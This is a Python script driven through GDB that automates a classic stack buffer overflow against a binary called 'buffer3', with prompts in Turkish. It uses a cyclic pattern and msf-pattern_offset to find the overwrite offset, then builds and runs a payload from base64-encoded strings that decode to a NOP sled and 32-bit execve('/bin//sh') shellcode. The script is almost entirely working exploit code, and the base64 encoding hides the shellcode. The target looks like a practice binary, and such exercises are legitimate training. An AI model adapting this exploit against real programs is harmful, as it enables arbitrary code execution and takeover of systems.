import gdb
import os
import base64
gdb.execute('file buffer3')

gdb.execute('disas main')


pyth = """`python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"'`"""

gdb.execute("run "+pyth)

gdb.execute("info frame")

gdb.execute("info registers")







strcpy = input("strcpy num giriniz -> ")





a = input("eip giriniz -> ")
os.system("msf-pattern_offset -q "+a+" -l 1024")
gdb.execute("b*main+"+strcpy)
data = input("pattern offset cikti -> ")

dat = int(data)-24



pyth = "cnVuICQocHl0aG9uIC1jICdwcmludCBiIlx4OTAiKg=="

aaaa = base64.b64decode(pyth.encode('ascii'))


pyth3 = "KyBiIlx4MzFceGMwXHg5OVx4NTBceDY4XHgyZlx4MmZceDczXHg2OFx4NjhceDJmXHg2Mlx4NjlceDZlXHg4OVx4ZTNceDUwXHg1M1x4ODlceGUxXHhiMFx4MGJceGNkXHg4MCInKQ=="

aaaa2 = base64.b64decode(pyth3.encode('ascii'))
b = str(aaaa2.decode('ascii'))
a = str(dat)


c = str(aaaa.decode('ascii'))

print (c+a+b)
gdb.execute(c+a+b)


gdb.execute("x/100000s $esp")


son = input("esp inject number endianesli hali-> ")


pyth2 = "cnVuICQocHl0aG9uIC1jICdwcmludCBiIlx4OTAiKg=="
bbbb = base64.b64decode(pyth2.encode('ascii'))

pyth4 = "KyAiXHgzMVx4YzBceDk5XHg1MFx4NjhceDJmXHgyZlx4NzNceDY4XHg2OFx4MmZceDYyXHg2OVx4NmVceDg5XHhlM1x4NTBceDUzXHg4OVx4ZTFceGIwXHgwYlx4Y2RceDgwIisi"
bbbb2 = base64.b64decode(pyth4.encode('ascii'))

d = str(bbbb.decode('ascii'))

e = str(bbbb2.decode('ascii'))


sons = str(son+'"')


kapama = str("')")






gdb.execute(d+a+e+sons+kapama)

gdb.execute("c")

print (pyth2)
